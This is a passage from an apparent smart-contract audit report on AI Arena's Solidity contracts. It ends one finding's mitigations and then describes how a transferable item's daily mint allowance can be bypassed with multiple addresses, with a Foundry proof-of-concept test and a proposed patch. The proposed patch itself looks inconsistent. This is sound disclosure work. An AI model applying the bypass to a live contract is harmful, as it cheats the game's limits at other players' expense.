        uint256 mergingPortion,
        uint8 battleResult,
        uint256 eloFactor,
        bool initiatorBool
    ) external {
+       require(hasUnstaked[tokenId][roundId] == false, "Cannot play after unstaking this round");
        require(msg.sender == _gameServerAddress);
        require(mergingPortion <= 100);
        .
        .
        .
```

2. Add another storage mapping in the `StakeAtRisk.sol` contract that also keeps track of the amount an address has lost in the current round

```diff
+   mapping(uint256 => mapping(address => uint256)) public amountLostThisRound;

    /// @notice Reclaims NRN tokens from the stake at risk.
    /// @dev This function can only be called by the RankedBattle contract to reclaim
    /// NRN tokens from the stake at risk.
    /// @dev This gets triggered when they win a match while having NRNs at risk.
    /// @param nrnToReclaim The amount of NRN tokens to reclaim.
    /// @param fighterId The ID of the fighter.
    /// @param fighterOwner The owner of the fighter.
    function reclaimNRN(uint256 nrnToReclaim, uint256 fighterId, address fighterOwner) external {
        require(msg.sender == _rankedBattleAddress, "Call must be from RankedBattle contract");
        require(stakeAtRisk[roundId][fighterId] >= nrnToReclaim, "Fighter does not have enough stake at risk");

        bool success = _neuronInstance.transfer(_rankedBattleAddress, nrnToReclaim);
        if (success) {
            stakeAtRisk[roundId][fighterId] -= nrnToReclaim;
            totalStakeAtRisk[roundId] -= nrnToReclaim;
            amountLost[fighterOwner] -= nrnToReclaim;
+           amountLostThisRound[roundId][fighterOwner] -= nrnToReclaim;
            emit ReclaimedStake(fighterId, nrnToReclaim);
        }
    }
```

Implementing either of these changes makes the previous Proof of Code test function fail/revert. NOTE: At the second mitigation it reverts with arithmetic underflow error message because `amountLostThisRound` tries to go below 0.

# [M-3] - Daily allowance for transferable game items is useless, users can mint from multiple addresses and transfer to one

## Lines of code
[https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/GameItems.sol#L41](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/GameItems.sol#L41)

## Vulnerability details

In `GameItems.sol` contract game items are defined as such:

```javascript
    struct GameItemAttributes {
        string name;
        bool finiteSupply;
        bool transferable;
        uint256 itemsRemaining;
        uint256 itemPrice;
        uint256 dailyAllowance;
    }
```

`dailyAllowance` is how many of this `game item` a user can mint per day and is only checked during the `mint` function.

```javascript
    function mint(uint256 tokenId, uint256 quantity) external {
        require(tokenId < _itemCount);
        uint256 price = allGameItemAttributes[tokenId].itemPrice * quantity;
        require(_neuronInstance.balanceOf(msg.sender) >= price, "Not enough NRN for purchase");
        require(
            allGameItemAttributes[tokenId].finiteSupply == false || 
            (
                allGameItemAttributes[tokenId].finiteSupply == true && 
                quantity <= allGameItemAttributes[tokenId].itemsRemaining
            )
        );
@>      require(
            dailyAllowanceReplenishTime[msg.sender][tokenId] <= block.timestamp || 
            quantity <= allowanceRemaining[msg.sender][tokenId]
        );
        .
        .
        .
```

If a `game item` is transferable, then `dailyAllowance` is useless. A user can create multiple address, mint their `dailyAllowance` and then transfer all these `game items` to one address. At the moment we only have 1 known game item, the battery. It is said that a battery is `transferable` and has `dailyAllowance = 10`. There is no further checks on the usage of the battery to replenish voltage and be able to play as much as he wants.

## Impact

A user can bypass his `dailyAllowance`. He can mint daily as many batteries as he wants, using other addresses, and use them. That way he can play more games daily than an average user who doesn't know about this loophole.

## Proof of Concept

In the following example we go through a scenario explained by the comments. First, place the following code in `RankedBattle.t.sol` test file at the ed of the `setUp` function:

```javascript
        _neuronContract.addSpender(address(_gameItemsContract));
        _gameItemsContract.instantiateNeuronContract(address(_neuronContract));
        _gameItemsContract.createGameItem("Battery", "https://ipfs.io/ipfs/", true, true, 10_000, 1 * 10 ** 18, 10);
        _gameItemsContract.setAllowedBurningAddresses(address(_voltageManagerContract));
```

Now paste the following test in `RankedBattle.t.sol` test file:

```javascript
    function testDailyAllowanceBypass() public {
        address attacker = vm.addr(3);
        address attacker2 = vm.addr(4);
        _fundUserWith4kNeuronByTreasury(attacker);
        _fundUserWith4kNeuronByTreasury(attacker2);

        // Use helper function to mint attacker 1 NFT
        _mintFromMergingPool(attacker);
        uint8 attackerTokenId = 0;

        // Attacker mints his daily allowance of 10 game items
        vm.startPrank(attacker);
        _gameItemsContract.mint(0, 10);

        // Confirm attacker can't mint 11th game item and exceed his allowance
        vm.expectRevert();
        _gameItemsContract.mint(0, 1);
        vm.stopPrank();

        // Attacker's second address mints another 10 game items
        vm.prank(attacker2);
        _gameItemsContract.mint(0, 10);

        // Attacker transfers the items from his second address to his first
        vm.prank(attacker2);
        _gameItemsContract.safeTransferFrom(attacker2, attacker, 0, 10, "");
        assertEq(_gameItemsContract.balanceOf(attacker2, 0), 0);
        assertEq(_gameItemsContract.balanceOf(attacker, 0), 20);

        // Confirm attacker can use 15 voltage batteries
        // To do this we also play a game between because you can only use a battery
        // If your voltage is below 100
        for(uint256 i = 0; i < 15; i++){
            vm.prank(address(_GAME_SERVER_ADDRESS));
            _rankedBattleContract.updateBattleRecord(attackerTokenId, 0, 0, 1500, true);
            vm.prank(attacker);
            _voltageManagerContract.useVoltageBattery();
        }

        // Confirm attacker has user 15 batteries and has 5 remaining
        assertEq(_gameItemsContract.balanceOf(attacker, 0), 5);
    }
```

## Tools Used

Foundry, manual review

## Recommended Mitigation Steps

Consider updating the `allowanceRemaining` also in the `safeTransferFrom` function:

```diff
    function safeTransferFrom(
        address from, 
        address to, 
        uint256 tokenId,
        uint256 amount,
        bytes memory data
    ) 
        public 
        override(ERC1155)
    {
        require(allGameItemAttributes[tokenId].transferable);
+       require(
+           dailyAllowanceReplenishTime[to][tokenId] <= block.timestamp || 
+           amount <= allowanceRemaining[to][tokenId]
+       );
+       if (dailyAllowanceReplenishTime[to][tokenId] <= block.timestamp) {
+               _replenishDailyAllowance(tokenId, to);
+       }
+       allowanceRemaining[msg.sender][tokenId] -= amount;
        super.safeTransferFrom(from, to, tokenId, amount, data);
    }
```

Notice in the above recommendation we are calling a different `_replenishDailyAllowance` function than the one implemented in the contract. That way we can replenish the daily allowance of the receiver if needed.

```diff
    function _replenishDailyAllowance(uint256 tokenId) private {
        allowanceRemaining[msg.sender][tokenId] = allGameItemAttributes[tokenId].dailyAllowance;
        dailyAllowanceReplenishTime[msg.sender][tokenId] = uint32(block.timestamp + 1 days);
    }    

+   function _replenishDailyAllowance(uint256 tokenId, address user) private {
+       allowanceRemaining[user][tokenId] = allGameItemAttributes[tokenId].dailyAllowance;
+       dailyAllowanceReplenishTime[user][tokenId] = uint32(block.timestamp + 1 days);
+   }
```
